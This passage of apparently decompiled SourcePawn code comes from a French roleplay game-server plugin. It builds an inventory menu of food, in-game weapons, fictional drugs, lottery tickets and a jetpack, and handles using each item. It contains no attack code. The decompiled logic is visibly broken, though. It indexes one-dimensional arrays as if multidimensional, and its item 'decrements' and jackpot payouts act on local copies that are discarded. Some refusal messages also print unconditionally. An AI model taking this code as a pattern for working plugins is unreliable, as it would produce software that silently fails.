		LogMessage("Les %ss recevront maintenant %i$ de salaire.", RName, salary2);
	}
	else
	{
		if (action == MenuAction:16)
		{
			CloseHandle(choice);
		}
	}
	return 0;
}

Handle:BuildItemMenu(client, Entity)
{
	decl String:Buffer[128];
	new Handle:Item = CreateMenu(Menu_Item, MenuAction:28);
	SetMenuTitle(Item, "Selectionnez un objet a utiliser:");
	new var1;
	if (!ShowComposant[client][0][0])
	{
		AddMenuItem(Item, "vipitems", "========== Objets VIP =========", 1);
		if (0 < ItemLanceFlamme[client][0][0])
		{
			Format(Buffer, 128, "Lance-Flamme (Quantite: %i)", ItemLanceFlamme[client]);
			AddMenuItem(Item, "LanceFlamme", Buffer, 0);
		}
		else
		{
			AddMenuItem(Item, "LanceFlamme", "Lance-Flamme (Quantite: 0 - Disponible dans la boutique)", 1);
		}
		if (0 < ItemHEFreeze[client][0][0])
		{
			Format(Buffer, 128, "Grenade petrifiante (Quantite: %i)", ItemHEFreeze[client]);
			AddMenuItem(Item, "HEFreeze", Buffer, 0);
		}
		else
		{
			AddMenuItem(Item, "HEFreeze", "Grenade petrifiante (Quantite: 0 - Disponible dans la boutique)", 1);
		}
		if (0 < ItemHEFire[client][0][0])
		{
			Format(Buffer, 128, "Grenade incendiaire (Quantite: %i)", ItemHEFire[client]);
			AddMenuItem(Item, "HEFire", Buffer, 0);
		}
		else
		{
			AddMenuItem(Item, "HEFire", "Grenade petrifiante (Quantite: 0 - Disponible dans la boutique)", 1);
		}
		AddMenuItem(Item, "basicitems", "========== Objets Normaux =========", 1);
		AddMenuItem(Item, "composants", "***** COMPOSANTS *****", 0);
		AddMenuItem(Item, "weapons", "***** ARMES *****", 0);
		AddMenuItem(Item, "drugs", "***** DROGUES *****", 0);
		AddMenuItem(Item, "other", "***** AUTRES *****", 0);
	}
	else
	{
		AddMenuItem(Item, "retour", "RETOUR", 0);
		AddMenuItem(Item, "---", "------------------------", 1);
	}
	if (ShowComposant[client][0][0])
	{
		ShowWeapons[client] = 0;
		ShowDrugs[client] = 0;
		ShowOther[client] = 0;
		if (0 < ItemPizza[client][0][0])
		{
			Format(Buffer, 128, "Pizza (Quantite: %i)", ItemPizza[client]);
			AddMenuItem(Item, "ItemPizza", Buffer, 0);
		}
		if (0 < ItemLessive[client][0][0])
		{
			Format(Buffer, 128, "Lessive (Quantite: %i)", ItemLessive[client]);
			AddMenuItem(Item, "ItemLessive", Buffer, 0);
		}
		if (0 < ItemMojito[client][0][0])
		{
			Format(Buffer, 128, "Mojito (Quantite: %i)", ItemMojito[client]);
			AddMenuItem(Item, "ItemMojito", Buffer, 0);
		}
		if (0 < ItemRedbull[client][0][0])
		{
			Format(Buffer, 128, "RedBull (Quantite: %i)", ItemRedbull[client]);
			AddMenuItem(Item, "ItemRedbull", Buffer, 0);
		}
		if (0 < ItemVodka[client][0][0])
		{
			Format(Buffer, 128, "Bouteille de Vodka (Quantite: %i)", ItemVodka[client]);
			AddMenuItem(Item, "ItemVodka", Buffer, 0);
		}
		if (0 < ItemSucetteMenthe[client][0][0])
		{
			Format(Buffer, 128, "Sucette Menthe (Quantite: %i)", ItemSucetteMenthe[client]);
			AddMenuItem(Item, "ItemSucetteMenthe", Buffer, 0);
		}
		if (0 < ItemDroom[client][0][0])
		{
			Format(Buffer, 128, "Droom (Quantite: %i)", ItemDroom[client]);
			AddMenuItem(Item, "ItemDroom", Buffer, 0);
		}
		if (0 < ItemGateauChoco[client][0][0])
		{
			Format(Buffer, 128, "GateauChoco (Quantite: %i)", ItemGateauChoco[client]);
			AddMenuItem(Item, "ItemGateauChoco", Buffer, 0);
		}
		if (0 < ItemNuteChoco[client][0][0])
		{
			Format(Buffer, 128, "NuteChoco (Quantite: %i)", ItemNuteChoco[client]);
			AddMenuItem(Item, "ItemNuteChoco", Buffer, 0);
		}
		if (0 < ItemCafe[client][0][0])
		{
			Format(Buffer, 128, "Cafe (Quantite: %i)", ItemCafe[client]);
			AddMenuItem(Item, "ItemCafe", Buffer, 0);
		}
		if (0 < KitSoins[client][0][0])
		{
			Format(Buffer, 128, "Kit de Soins (Quantite: %i)", KitSoins[client]);
			AddMenuItem(Item, "KitSoins", Buffer, 0);
		}
	}
	if (ShowWeapons[client][0][0])
	{
		ShowComposant[client] = 0;
		ShowDrugs[client] = 0;
		ShowOther[client] = 0;
		if (0 < StuffCartouche[client][0][0])
		{
			Format(Buffer, 128, "Cartouche (Quantite: %i)", StuffCartouche[client]);
			AddMenuItem(Item, "StuffCartouche", Buffer, 0);
		}
		if (0 < StuffGrenade[client][0][0])
		{
			Format(Buffer, 128, "Grenade (Quantite: %i)", StuffGrenade[client]);
			AddMenuItem(Item, "StuffGrenade", Buffer, 0);
		}
		if (0 < StuffFlash[client][0][0])
		{
			Format(Buffer, 128, "Flash (Quantite: %i)", StuffFlash[client]);
			AddMenuItem(Item, "StuffFlash", Buffer, 0);
		}
		if (0 < StuffFumi[client][0][0])
		{
			Format(Buffer, 128, "Fumi (Quantite: %i)", StuffFumi[client]);
			AddMenuItem(Item, "StuffFumi", Buffer, 0);
		}
		if (0 < StuffKevelar[client][0][0])
		{
			Format(Buffer, 128, "Kevlar (Quantite: %i)", StuffKevelar[client]);
			AddMenuItem(Item, "StuffKevelar", Buffer, 0);
		}
		if (0 < ItemColorBall[client][0][0])
		{
			Format(Buffer, 128, "Billes de Couleur (Quantite: %i)", ItemColorBall[client]);
			AddMenuItem(Item, "ItemColorBall", Buffer, 0);
		}
		if (0 < WeaponGlock[client][0][0])
		{
			Format(Buffer, 128, "Glock (Quantite: %i)", WeaponGlock[client]);
			AddMenuItem(Item, "WeaponGlock", Buffer, 0);
		}
		if (0 < WeaponUSP[client][0][0])
		{
			Format(Buffer, 128, "USP (Quantite: %i)", WeaponUSP[client]);
			AddMenuItem(Item, "WeaponUSP", Buffer, 0);
		}
		if (0 < Weaponp228[client][0][0])
		{
			Format(Buffer, 128, "Compact P228 (Quantite: %i)", Weaponp228[client]);
			AddMenuItem(Item, "Weaponp228", Buffer, 0);
		}
		if (0 < Weapondeagle[client][0][0])
		{
			Format(Buffer, 128, "Deagle (Quantite: %i)", Weapondeagle[client]);
			AddMenuItem(Item, "Weapondeagle", Buffer, 0);
		}
		if (0 < Weaponelite[client][0][0])
		{
			Format(Buffer, 128, "Elites (Quantite: %i)", Weaponelite[client]);
			AddMenuItem(Item, "Weaponelite", Buffer, 0);
		}
		if (0 < Weaponfiveseven[client][0][0])
		{
			Format(Buffer, 128, "Five Seven (Quantite: %i)", Weaponfiveseven[client]);
			AddMenuItem(Item, "Weaponfiveseven", Buffer, 0);
		}
		if (0 < Weaponm3[client][0][0])
		{
			Format(Buffer, 128, "M3 Pompe (Quantite: %i)", Weaponm3[client]);
			AddMenuItem(Item, "Weaponm3", Buffer, 0);
		}
		if (0 < Weaponxm1014[client][0][0])
		{
			Format(Buffer, 128, "XM1014 Pompe Auto (Quantite: %i)", Weaponxm1014[client]);
			AddMenuItem(Item, "Weaponxm1014", Buffer, 0);
		}
		if (0 < Weapongalil[client][0][0])
		{
			Format(Buffer, 128, "Galil (Quantite: %i)", Weapongalil[client]);
			AddMenuItem(Item, "Weapongalil", Buffer, 0);
		}
		if (0 < Weaponak47[client][0][0])
		{
			Format(Buffer, 128, "AK47 (Quantite: %i)", Weaponak47[client]);
			AddMenuItem(Item, "Weaponak47", Buffer, 0);
		}
		if (0 < Weaponscout[client][0][0])
		{
			Format(Buffer, 128, "Scout (Quantite: %i)", Weaponscout[client]);
			AddMenuItem(Item, "Weaponscout", Buffer, 0);
		}
		if (0 < Weaponsg552[client][0][0])
		{
			Format(Buffer, 128, "SG552 (Quantite: %i)", Weaponsg552[client]);
			AddMenuItem(Item, "Weaponsg552", Buffer, 0);
		}
		if (0 < Weaponawp[client][0][0])
		{
			Format(Buffer, 128, "AWP (Quantite: %i)", Weaponawp[client]);
			AddMenuItem(Item, "Weaponawp", Buffer, 0);
		}
		if (0 < Weapong3sg1[client][0][0])
		{
			Format(Buffer, 128, "G3SG1 (Quantite: %i)", Weapong3sg1[client]);
			AddMenuItem(Item, "Weapong3sg1", Buffer, 0);
		}
		if (0 < Weaponfamas[client][0][0])
		{
			Format(Buffer, 128, "Famas (Quantite: %i)", Weaponfamas[client]);
			AddMenuItem(Item, "Weaponfamas", Buffer, 0);
		}
		if (0 < Weaponm4a1[client][0][0])
		{
			Format(Buffer, 128, "M4A1 (Quantite: %i)", Weaponm4a1[client]);
			AddMenuItem(Item, "Weaponm4a1", Buffer, 0);
		}
		if (0 < Weaponaug[client][0][0])
		{
			Format(Buffer, 128, "AUG (Quantite: %i)", Weaponaug[client]);
			AddMenuItem(Item, "Weaponaug", Buffer, 0);
		}
		if (0 < Weaponsg550[client][0][0])
		{
			Format(Buffer, 128, "SG550 (Quantite: %i)", Weaponsg550[client]);
			AddMenuItem(Item, "Weaponsg550", Buffer, 0);
		}
		if (0 < Weaponmac10[client][0][0])
		{
			Format(Buffer, 128, "Mac10 (Quantite: %i)", Weaponmac10[client]);
			AddMenuItem(Item, "Weaponmac10", Buffer, 0);
		}
		if (0 < Weapontmp[client][0][0])
		{
			Format(Buffer, 128, "TMP (Quantite: %i)", Weapontmp[client]);
			AddMenuItem(Item, "Weapontmp", Buffer, 0);
		}
		if (0 < Weaponmp5navy[client][0][0])
		{
			Format(Buffer, 128, "MP5 Navy (Quantite: %i)", Weaponmp5navy[client]);
			AddMenuItem(Item, "Weaponmp5navy", Buffer, 0);
		}
		if (0 < Weaponump45[client][0][0])
		{
			Format(Buffer, 128, "UMP45 (Quantite: %i)", Weaponump45[client]);
			AddMenuItem(Item, "Weaponump45", Buffer, 0);
		}
		if (0 < Weaponp90[client][0][0])
		{
			Format(Buffer, 128, "P90 (Quantite: %i)", Weaponp90[client]);
			AddMenuItem(Item, "Weaponp90", Buffer, 0);
		}
		if (0 < Weaponm249[client][0][0])
		{
			Format(Buffer, 128, "M249 (Quantite: %i)", Weaponm249[client]);
			AddMenuItem(Item, "Weaponm249", Buffer, 0);
		}
	}
	if (ShowDrugs[client][0][0])
	{
		ShowComposant[client] = 0;
		ShowWeapons[client] = 0;
		ShowOther[client] = 0;
		if (0 < DrogueLSD[client][0][0])
		{
			Format(Buffer, 128, "LSD (Quantite: %i)", DrogueLSD[client]);
			AddMenuItem(Item, "DrogueLSD", Buffer, 0);
		}
		if (0 < DrogueHero[client][0][0])
		{
			Format(Buffer, 128, "Heroine (Quantite: %i)", DrogueHero[client]);
			AddMenuItem(Item, "DrogueHero", Buffer, 0);
		}
		if (0 < DrogueExtasy[client][0][0])
		{
			Format(Buffer, 128, "Extasy (Quantite: %i)", DrogueExtasy[client]);
			AddMenuItem(Item, "DrogueExtasy", Buffer, 0);
		}
		if (0 < DrogueCoke[client][0][0])
		{
			Format(Buffer, 128, "Cocaine (Quantite: %i)", DrogueCoke[client]);
			AddMenuItem(Item, "DrogueCoke", Buffer, 0);
		}
		if (0 < DrogueWeed[client][0][0])
		{
			Format(Buffer, 128, "Weed (Quantite: %i)", DrogueWeed[client]);
			AddMenuItem(Item, "DrogueWeed", Buffer, 0);
		}
	}
	if (ShowOther[client][0][0])
	{
		ShowComposant[client] = 0;
		ShowWeapons[client] = 0;
		ShowDrugs[client] = 0;
		if (0 < KitCrochettage[client][0][0])
		{
			Format(Buffer, 128, "Kit de Crochettage (Quantite: %i)", KitCrochettage[client]);
			AddMenuItem(Item, "KitCrochettage", Buffer, 0);
		}
		if (0 < DiplomeTir[client][0][0])
		{
			Format(Buffer, 128, "Diplome de Tir (Quantite: %i)", DiplomeTir[client]);
			AddMenuItem(Item, "DiplomeTir", Buffer, 0);
		}
		if (0 < PermisLeger[client][0][0])
		{
			Format(Buffer, 128, "Permis d'armes leger (Quantite: %i)", PermisLeger[client]);
			AddMenuItem(Item, "PermisLeger", Buffer, 0);
		}
		if (0 < PermisLourd[client][0][0])
		{
			Format(Buffer, 128, "Permis d'armes lourd (Quantite: %i)", PermisLourd[client]);
			AddMenuItem(Item, "PermisLourd", Buffer, 0);
		}
		if (0 < ItemTicket10[client][0][0])
		{
			Format(Buffer, 128, "Ticket de 10$ (Quantite: %i)", ItemTicket10[client]);
			AddMenuItem(Item, "ItemTicket10", Buffer, 0);
		}
		if (0 < ItemTicket50[client][0][0])
		{
			Format(Buffer, 128, "Ticket de 50$ (Quantite: %i)", ItemTicket50[client]);
			AddMenuItem(Item, "ItemTicket50", Buffer, 0);
		}
		if (0 < ItemTicket100[client][0][0])
		{
			Format(Buffer, 128, "Ticket de 100$ (Quantite: %i)", ItemTicket100[client]);
			AddMenuItem(Item, "ItemTicket100", Buffer, 0);
		}
		if (0 < ItemTicket500[client][0][0])
		{
			Format(Buffer, 128, "Ticket de 500$ (Quantite: %i)", ItemTicket500[client]);
			AddMenuItem(Item, "ItemTicket500", Buffer, 0);
		}
		if (0 < ItemJetPack[client][0][0])
		{
			Format(Buffer, 128, "AirControl (Quantite: %i)", ItemJetPack[client]);
			AddMenuItem(Item, "ItemJetPack", Buffer, 0);
		}
		if (0 < ItemGazAC[client][0][0])
		{
			Format(Buffer, 128, "Bonbonne de Gaz AirControl (Quantite: %i)", ItemGazAC[client]);
			AddMenuItem(Item, "ItemGazAC", Buffer, 0);
		}
	}
	DisplayMenu(Item, Entity, 0);
	return Handle:0;
}

public Menu_Item(Handle:Item, MenuAction:action, param1, param2)
{
	if (action == MenuAction:4)
	{
		if (!IsInJail[param1][0][0])
		{
			decl String:info[32];
			GetMenuItem(Item, param2, info, 32, 0, "", 0);
			if (StrEqual(info, "retour", true))
			{
				ShowComposant[param1] = 0;
				ShowWeapons[param1] = 0;
				ShowDrugs[param1] = 0;
				ShowOther[param1] = 0;
			}
			if (StrEqual(info, "composants", true))
			{
				if (ShowComposant[param1][0][0])
				{
					ShowComposant[param1] = 0;
				}
				ShowComposant[param1] = 1;
			}
			if (StrEqual(info, "weapons", true))
			{
				if (ShowWeapons[param1][0][0])
				{
					ShowWeapons[param1] = 0;
				}
				ShowWeapons[param1] = 1;
			}
			if (StrEqual(info, "drugs", true))
			{
				if (ShowDrugs[param1][0][0])
				{
					ShowDrugs[param1] = 0;
				}
				ShowDrugs[param1] = 1;
			}
			if (StrEqual(info, "other", true))
			{
				if (ShowOther[param1][0][0])
				{
					ShowOther[param1] = 0;
				}
				ShowOther[param1] = 1;
			}
			if (StrEqual(info, "ItemColorBall", true))
			{
				new var1 = ItemColorBall[param1];
				var1 = var1[0][0] + -1;
				new var2 = ColorBallCount[param1];
				var2 = var2[0][0] + 500;
				PrintToChat(param1, "[L-RP] Vous avez maintenant 500 billes de couleur en plus.");
			}
			if (StrEqual(info, "LanceFlamme", true))
			{
				new var3 = ItemLanceFlamme[param1];
				var3 = var3[0][0] + -1;
				FlameLeft[param1] = 10;
				PrintToChat(param1, "[L-RP] Vous etes maintenant equipe d'un Lance-Flamme de 10 utilisations. (Tapez /flame pour l'utiliser)");
			}
			if (StrEqual(info, "HEFreeze", true))
			{
				new var4 = ItemHEFreeze[param1];
				var4 = var4[0][0] + -1;
				HasHEFreeze[param1] = 1;
				GivePlayerItem(param1, "weapon_smokegrenade", 0);
				PrintToChat(param1, "[L-RP] Vous etes maintenant equipe d'une grenade paralysante");
			}
			if (StrEqual(info, "HEFire", true))
			{
				new var5 = ItemHEFire[param1];
				var5 = var5[0][0] + -1;
				HasHEFire[param1] = 1;
				GivePlayerItem(param1, "weapon_hegrenade", 0);
				PrintToChat(param1, "[L-RP] Vous etes maintenant equipe d'une grenade incendiaire");
			}
			if (StrEqual(info, "KitCrochettage", true))
			{
				if (JobID[param1][0][0] == 7)
				{
					ItemCrochettage(param1);
				}
				PrintToChat(param1, "[L-RP] Le Kit de Crochettage est reserve aux mafieux.");
			}
			if (StrEqual(info, "ItemPizza", true))
			{
				new result = GiveHP(param1, 25);
				if (result)
				{
					new var6 = ItemPizza[param1];
					var6 = var6[0][0] + -1;
					PrintToChat(param1, "[L-RP] Vous avez manger une pizza.");
				}
			}
			if (StrEqual(info, "ItemLessive", true))
			{
				if (!IsInJail[param1][0][0])
				{
					new spawn_here = GetRandomInt(0, g_SpawnQtyT);
					TeleportEntity(param1, g_SpawnLocT[spawn_here][0][0], NULL_VECTOR, NULL_VECTOR);
					new var7 = ItemLessive[param1];
					var7 = var7[0][0] + -1;
					PrintToChat(param1, "[L-RP] Vous avez utiliser une lessive.");
				}
				PrintToChat(param1, "[L-RP] Vous ne pouvez pas utiliser de lessive en prison.");
			}
			if (StrEqual(info, "ItemMojito", true))
			{
				new result = GiveHP(param1, 25);
				if (result)
				{
					ClientCommand(param1, "r_screenoverlay effects/tp_eyefx/tpeye3.vmt");
					SetEntProp(param1, PropType:1, "m_ArmorValue", any:100, 4, 0);
					new var8 = ItemMojito[param1];
					var8 = var8[0][0] + -1;
					PrintToChat(param1, "[L-RP] Vous avez bu un Mojito.");
				}
			}
			if (StrEqual(info, "ItemRedbull", true))
			{
				ItemRedbulle(param1);
				new var9 = ItemRedbull[param1];
				var9 = var9[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez bu une canette de RedBull.");
			}
			if (StrEqual(info, "ItemVodka", true))
			{
				ItemVodkas(param1);
				new var10 = ItemVodka[param1];
				var10 = var10[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez bu une bouteille de Vodka.");
			}
			if (StrEqual(info, "ItemDroom", true))
			{
				ModifyGravity(param1, any:1060320051, 300);
				new var11 = ItemDroom[param1];
				var11 = var11[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez manger un Droom.");
			}
			if (StrEqual(info, "ItemSucetteMenthe", true))
			{
				new result = GiveHP(param1, 40);
				if (result)
				{
					ModifySpeed(param1, any:1067030938, 15);
					new var12 = ItemSucetteMenthe[param1];
					var12 = var12[0][0] + -1;
					PrintToChat(param1, "[L-RP] Vous avez sucer un Sucette Menthe.");
				}
			}
			if (StrEqual(info, "ItemGateauChoco", true))
			{
				new result = GiveHP(param1, 25);
				if (result)
				{
					new var13 = ItemGateauChoco[param1];
					var13 = var13[0][0] + -1;
					PrintToChat(param1, "[L-RP] Vous avez manger un GateauChoco.");
				}
			}
			if (StrEqual(info, "ItemNuteChoco", true))
			{
				new result = GiveHP(param1, 15);
				if (result)
				{
					new var14 = ItemNuteChoco[param1];
					var14 = var14[0][0] + -1;
					PrintToChat(param1, "[L-RP] Vous avez manger un NuteChoco.");
				}
			}
			if (StrEqual(info, "ItemCafe", true))
			{
				new var15 = ItemCafe[param1];
				var15 = var15[0][0] + -1;
				ModifySpeed(param1, any:1067869798, 20);
				PrintToChat(param1, "[L-RP] Vous avez bu un Cafe.");
			}
			if (StrEqual(info, "DiplomeTir", true))
			{
				new var16 = DiplomeTir[param1];
				var16 = var16[0][0] + -1;
				HasDiplome[param1] = 1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Diplome de Tir, n'oubliez-pas que vous perdez cette competence a votre deconnexion.");
			}
			if (StrEqual(info, "PermisLeger", true))
			{
				new var17 = PermisLeger[param1];
				var17 = var17[0][0] + -1;
				HasPermisLeger[param1] = 1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Permis Leger.");
			}
			if (StrEqual(info, "PermisLourd", true))
			{
				new var18 = PermisLourd[param1];
				var18 = var18[0][0] + -1;
				HasPermisLourd[param1] = 1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Permis Lourd.");
			}
			if (StrEqual(info, "ItemTicket10", true))
			{
				new var19 = ItemTicket10[param1];
				var19 = var19[0][0] + -1;
				new random = GetRandomInt(1, 50);
				if (random == 25)
				{
					new var20 = money[param1];
					var20 = var20[0][0] + 1000;
					PrintToChat(param1, "[L-RP] Felicitation ! Vous avez remporter le jackpot de 1000$");
				}
				else
				{
					PrintToChat(param1, "[L-RP] Vous avez perdu, vous aurez surement plus de chance une autre fois !");
				}
			}
			if (StrEqual(info, "ItemTicket50", true))
			{
				new var21 = ItemTicket50[param1];
				var21 = var21[0][0] + -1;
				new random = GetRandomInt(1, 50);
				if (random == 25)
				{
					new var22 = money[param1];
					var22 = var22[0][0] + 5000;
					PrintToChat(param1, "[L-RP] Felicitation ! Vous avez remporter le jackpot de 5000$");
				}
				else
				{
					PrintToChat(param1, "[L-RP] Vous avez perdu, vous aurez surement plus de chance une autre fois !");
				}
			}
			if (StrEqual(info, "ItemTicket100", true))
			{
				new var23 = ItemTicket100[param1];
				var23 = var23[0][0] + -1;
				new random = GetRandomInt(1, 50);
				if (random == 25)
				{
					new var24 = money[param1];
					var24 = var24[0][0] + 10000;
					PrintToChat(param1, "[L-RP] Felicitation ! Vous avez remporter le jackpot de 10000$");
				}
				else
				{
					PrintToChat(param1, "[L-RP] Vous avez perdu, vous aurez surement plus de chance une autre fois !");
				}
			}
			if (StrEqual(info, "ItemTicket500", true))
			{
				new var25 = ItemTicket500[param1];
				var25 = var25[0][0] + -1;
				new random = GetRandomInt(1, 50);
				if (random == 25)
				{
					new var26 = money[param1];
					var26 = var26[0][0] + 50000;
					PrintToChat(param1, "[L-RP] Felicitation ! Vous avez remporter le jackpot de 50000$");
				}
				else
				{
					PrintToChat(param1, "[L-RP] Vous avez perdu, vous aurez surement plus de chance une autre fois !");
				}
			}
			if (StrEqual(info, "ItemJetPack", true))
			{
				new var27 = ItemJetPack[param1];
				var27 = var27[0][0] + -1;
				HaveJetPack[param1] = 1;
				JetPackGaz[param1] = 60;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un JetPack. Pour l'utiliser appuyez sur Espace.");
			}
			if (StrEqual(info, "ItemGazAC", true))
			{
				if (HaveJetPack[param1][0][0])
				{
					new var28 = ItemGazAC[param1];
					var28 = var28[0][0] + -1;
					new var29 = JetPackGaz[param1];
					var29 = var29[0][0] + 120;
					PrintToChat(param1, "[L-RP] Vous avez utiliser une bonbonne de Gaz AirControl.");
				}
			}
			if (StrEqual(info, "StuffCartouche", true))
			{
				new var30 = StuffCartouche[param1];
				var30 = var30[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser une Cartouche.");
				ItemCartouches(param1);
			}
			if (StrEqual(info, "KitSoins", true))
			{
				ItemKitSoin(param1);
			}
			if (StrEqual(info, "StuffGrenade", true))
			{
				GivePlayerItem(param1, "weapon_hegrenade", 0);
				new var31 = StuffGrenade[param1];
				var31 = var31[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser une Grenade.");
			}
			if (StrEqual(info, "StuffFlash", true))
			{
				GivePlayerItem(param1, "weapon_flashbang", 0);
				new var32 = StuffFlash[param1];
				var32 = var32[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser une Flashbang.");
			}
			if (StrEqual(info, "StuffFumi", true))
			{
				GivePlayerItem(param1, "weapon_smokegrenade", 0);
				new var33 = StuffFumi[param1];
				var33 = var33[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser une Fumigene.");
			}
			if (StrEqual(info, "StuffKevelar", true))
			{
				GivePlayerItem(param1, "item_assaultsuit", 0);
				new var34 = StuffKevelar[param1];
				var34 = var34[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Kevlar.");
			}
			if (StrEqual(info, "WeaponGlock", true))
			{
				GivePlayerItem(param1, "weapon_glock", 0);
				new var35 = WeaponGlock[param1];
				var35 = var35[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Glock.");
			}
			if (StrEqual(info, "WeaponUSP", true))
			{
				GivePlayerItem(param1, "weapon_usp", 0);
				new var36 = WeaponUSP[param1];
				var36 = var36[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un USP.");
			}
			if (StrEqual(info, "Weaponp228", true))
			{
				GivePlayerItem(param1, "weapon_p228", 0);
				new var37 = Weaponp228[param1];
				var37 = var37[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Compact P228.");
			}
			if (StrEqual(info, "Weapondeagle", true))
			{
				GivePlayerItem(param1, "weapon_deagle", 0);
				new var38 = Weapondeagle[param1];
				var38 = var38[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Deagle.");
			}
			if (StrEqual(info, "Weaponelite", true))
			{
				GivePlayerItem(param1, "weapon_elite", 0);
				new var39 = Weaponelite[param1];
				var39 = var39[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Elite.");
			}
			if (StrEqual(info, "Weaponfiveseven", true))
			{
				GivePlayerItem(param1, "weapon_fiveseven", 0);
				new var40 = Weaponfiveseven[param1];
				var40 = var40[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Five Seven.");
			}
			if (StrEqual(info, "Weaponm3", true))
			{
				GivePlayerItem(param1, "weapon_m3", 0);
				new var41 = Weaponm3[param1];
				var41 = var41[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un M3.");
			}
			if (StrEqual(info, "Weaponxm1014", true))
			{
				GivePlayerItem(param1, "weapon_xm1014", 0);
				new var42 = Weaponxm1014[param1];
				var42 = var42[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un XM1014.");
			}
			if (StrEqual(info, "Weapongalil", true))
			{
				GivePlayerItem(param1, "weapon_galil", 0);
				new var43 = Weapongalil[param1];
				var43 = var43[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Galil.");
			}
			if (StrEqual(info, "Weaponak47", true))
			{
				GivePlayerItem(param1, "weapon_ak47", 0);
				new var44 = Weaponak47[param1];
				var44 = var44[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Ak47.");
			}
			if (StrEqual(info, "Weaponscout", true))
			{
				GivePlayerItem(param1, "weapon_scout", 0);
				new var45 = Weaponscout[param1];
				var45 = var45[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Scout.");
			}
			if (StrEqual(info, "Weaponsg552", true))
			{
				GivePlayerItem(param1, "weapon_sg552", 0);
				new var46 = Weaponsg552[param1];
				var46 = var46[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un SG552.");
			}
			if (StrEqual(info, "Weaponawp", true))
			{
				GivePlayerItem(param1, "weapon_awp", 0);
				new var47 = Weaponawp[param1];
				var47 = var47[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un AWP.");
			}
			if (StrEqual(info, "Weapong3sg1", true))
			{
				GivePlayerItem(param1, "weapon_g3sg1", 0);
				new var48 = Weapong3sg1[param1];
				var48 = var48[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un G3SG1.");
			}
			if (StrEqual(info, "Weaponfamas", true))
			{
				GivePlayerItem(param1, "weapon_famas", 0);
				new var49 = Weaponfamas[param1];
				var49 = var49[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un Famas.");
			}
			if (StrEqual(info, "Weaponm4a1", true))
			{
				GivePlayerItem(param1, "weapon_m4a1", 0);
				new var50 = Weaponm4a1[param1];
				var50 = var50[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un M4A1.");
			}
			if (StrEqual(info, "Weaponaug", true))
			{
				GivePlayerItem(param1, "weapon_aug", 0);
				new var51 = Weaponaug[param1];
				var51 = var51[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un AUG.");
			}
			if (StrEqual(info, "Weaponsg550", true))
			{
				GivePlayerItem(param1, "weapon_sg550", 0);
				new var52 = Weaponsg550[param1];
				var52 = var52[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un SG550.");
			}
			if (StrEqual(info, "Weaponmac10", true))
			{
				GivePlayerItem(param1, "weapon_mac10", 0);
				new var53 = Weaponmac10[param1];
				var53 = var53[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un MAC10.");
			}
			if (StrEqual(info, "Weapontmp", true))
			{
				GivePlayerItem(param1, "weapon_tmp", 0);
				new var54 = Weapontmp[param1];
				var54 = var54[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un TMP.");
			}
			if (StrEqual(info, "Weaponmp5navy", true))
			{
				GivePlayerItem(param1, "weapon_mp5navy", 0);
				new var55 = Weaponmp5navy[param1];
				var55 = var55[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un MP5 Navy.");
			}
			if (StrEqual(info, "Weaponump45", true))
			{
				GivePlayerItem(param1, "weapon_ump45", 0);
				new var56 = Weaponump45[param1];
				var56 = var56[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un UMP45.");
			}
			if (StrEqual(info, "Weaponp90", true))
			{
				GivePlayerItem(param1, "weapon_p90", 0);
				new var57 = Weaponp90[param1];
				var57 = var57[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un P90.");
			}
			if (StrEqual(info, "Weaponm249", true))
			{
				GivePlayerItem(param1, "weapon_m249", 0);
				new var58 = Weaponm249[param1];
				var58 = var58[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez utiliser un M249.");
			}
			if (StrEqual(info, "DrogueLSD", true))
			{
				ItemLSD(param1);
				new var59 = DrogueLSD[param1];
				var59 = var59[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez pris du LSD.");
			}
			if (StrEqual(info, "DrogueHero", true))
			{
				ItemHero(param1);
				new var60 = DrogueHero[param1];
				var60 = var60[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez pris de l'Heroine.");
			}
			if (StrEqual(info, "DrogueExtasy", true))
			{
				ItemExtasy(param1);
				new var61 = DrogueExtasy[param1];
				var61 = var61[0][0] + -1;
				PrintToChat(param1, "[L-RP] Vous avez pris de l'Extasy.");
			}
